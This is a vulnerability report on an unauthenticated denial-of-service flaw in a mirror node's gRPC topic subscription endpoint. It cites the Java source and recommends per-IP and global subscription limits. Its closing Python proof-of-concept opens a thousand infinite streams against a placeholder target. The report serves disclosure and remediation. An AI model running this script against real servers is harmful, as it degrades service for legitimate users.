### Title
Unbounded Fan-Out DoS via Unlimited Parallel `subscribeTopic` Streams with `limit=0`

### Summary
Any unauthenticated caller can open an arbitrary number of TCP connections to the gRPC port and, on each connection, open up to `maxConcurrentCallsPerConnection` (default 5) infinite `subscribeTopic` streams (`limit=0`) to the same high-traffic topic. For every incoming topic message, the server independently executes `toResponse()` protobuf serialization and a gRPC stream write for each attacker-controlled stream, multiplying CPU and memory consumption proportionally to the number of open streams. There is no per-IP connection cap, no global subscription limit, and no rate-limiting on the gRPC subscription endpoint.

### Finding Description

**Entry point — `ConsensusController.subscribeTopic()`** [1](#0-0) 

No authentication, no per-caller subscription count check. The method is open to any TCP client.

**`limit=0` means infinite subscription** [2](#0-1) 

`@Min(0)` allows `limit=0`; `hasLimit()` returns `false` when `limit == 0`, so `flux.take()` is never applied in `TopicMessageServiceImpl.subscribeTopic()`. [3](#0-2) 

**Per-subscriber serialization — `toResponse()`** [4](#0-3) 

The code comment at line 83 explicitly acknowledges: *"Consider caching this conversion for multiple subscribers to the same topic if the need arises."* Every message is serialized independently for every subscriber.

**Subscriber count is a metric only — never enforced** [5](#0-4) 

`subscriberCount` is a Micrometer gauge. It is incremented/decremented but never checked against any ceiling.

**Only per-connection limit, not per-IP or global** [6](#0-5) [7](#0-6) 

`maxConcurrentCallsPerConnection = 5` limits streams per TCP connection, but there is no limit on the number of TCP connections from a single IP. An attacker opens `C` connections × 5 streams = `5C` simultaneous infinite subscriptions.

**Shared upstream, per-subscriber downstream fan-out**

The Redis listener shares one upstream Flux per topic via `.share()`: [8](#0-7) 

But `SharedTopicListener.listen()` gives each subscriber its own backpressure buffer, `publishOn(boundedElastic())` scheduling slot, and downstream pipeline: [9](#0-8) 

Each message therefore triggers `N` independent `toResponse()` calls, `N` gRPC frame serializations, and `N` network writes.

### Impact Explanation

For a high-traffic topic receiving `M` messages/second and `N` attacker streams open:
- CPU: `N × M` protobuf serializations per second
- Memory: `N × maxBufferSize` (default 16 384 entries) backpressure buffers allocated
- Thread pool: `N` slots consumed from `boundedElastic()` scheduler

This degrades or crashes the gRPC service for all legitimate subscribers. The scope classification ("griefing with no economic damage to any user on the network") is accurate — the mirror node is disrupted but the consensus network itself is unaffected.

### Likelihood Explanation

The attack requires only a TCP client capable of opening multiple HTTP/2 connections to port 5600 (publicly exposed). No credentials, tokens, or special knowledge are needed. The attack is trivially scriptable with any gRPC client library (e.g., `grpcurl`, the Hedera Java SDK, or a raw HTTP/2 client). It is repeatable and persistent as long as the attacker keeps connections open.

### Recommendation

1. **Enforce a global per-IP subscription limit** in `ConsensusController.subscribeTopic()` or `TopicMessageServiceImpl.subscribeTopic()`, rejecting new subscriptions from IPs that already hold more than a configured threshold.
2. **Enforce a global total subscription ceiling** by checking `subscriberCount` against a configurable maximum before accepting a new subscription.
3. **Cache `toResponse()` output** for a short TTL keyed on `(topicId, sequenceNumber)` so that `N` subscribers to the same topic share one serialization result per message (the code comment at line 83 already anticipates this).
4. **Add per-IP connection limiting** at the Netty layer (e.g., `maxConnectionsPerIp`) in addition to the existing `maxConcurrentCallsPerConnection`.

### Proof of Concept

```python
# Pseudocode — repeat with any gRPC client
import grpc, threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = <high_traffic_topic>   # e.g., 0.0.12345
NUM_CONNECTIONS = 200
STREAMS_PER_CONN = 5              # maxConcurrentCallsPerConnection default

def open_streams(conn_idx):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC_ID,
        limit=0            # infinite, never terminates
    )
    streams = [stub.subscribeTopic(query) for _ in range(STREAMS_PER_CONN)]
    for s in streams:
        for _ in s:        # consume to keep stream alive
            pass

threads = [threading.Thread(target=open_streams, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
# Result: 1000 simultaneous infinite subscriptions; every topic message
# triggers 1000 independent toResponse() serializations on the server.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-53)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L83-116)
```java
    // Consider caching this conversion for multiple subscribers to the same topic if the need arises.
    private ConsensusTopicResponse toResponse(TopicMessage t) {
        final var consensusTopicResponseBuilder = ConsensusTopicResponse.newBuilder()
                .setConsensusTimestamp(ProtoUtil.toTimestamp(t.getConsensusTimestamp()))
                .setMessage(ProtoUtil.toByteString(t.getMessage()))
                .setRunningHash(ProtoUtil.toByteString(t.getRunningHash()))
                .setRunningHashVersion(
                        Objects.requireNonNullElse(t.getRunningHashVersion(), DEFAULT_RUNNING_HASH_VERSION))
                .setSequenceNumber(t.getSequenceNumber());

        if (t.getChunkNum() != null) {
            ConsensusMessageChunkInfo.Builder chunkBuilder = ConsensusMessageChunkInfo.newBuilder()
                    .setNumber(t.getChunkNum())
                    .setTotal(t.getChunkTotal());

            TransactionID transactionID = parseTransactionID(
                    t.getInitialTransactionId(), t.getTopicId().getNum(), t.getSequenceNumber());
            EntityId payerAccountEntity = t.getPayerAccountId();
            var validStartInstant = ProtoUtil.toTimestamp(t.getValidStartTimestamp());

            if (transactionID != null) {
                chunkBuilder.setInitialTransactionID(transactionID);
            } else if (payerAccountEntity != null && validStartInstant != null) {
                chunkBuilder.setInitialTransactionID(TransactionID.newBuilder()
                        .setAccountID(payerAccountEntity.toAccountID())
                        .setTransactionValidStart(validStartInstant)
                        .build());
            }

            consensusTopicResponseBuilder.setChunkInfo(chunkBuilder.build());
        }

        return consensusTopicResponseBuilder.build();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L25-41)
```java
    @Min(0)
    private long limit;

    @Min(0)
    @NotNull
    @Builder.Default
    private long startTime = DomainUtils.now();

    @Builder.Default
    private String subscriberId = RandomStringUtils.random(8, 0, 0, true, true, null, RANDOM);

    @NotNull
    private EntityId topicId;

    public boolean hasLimit() {
        return limit > 0;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L83-85)
```java
        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L33-33)
```java
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L59-62)
```java
    protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
        Topic topic = getTopic(filter);
        return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java (L21-26)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        return getSharedListener(filter)
                .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
                .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
                .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
    }
```
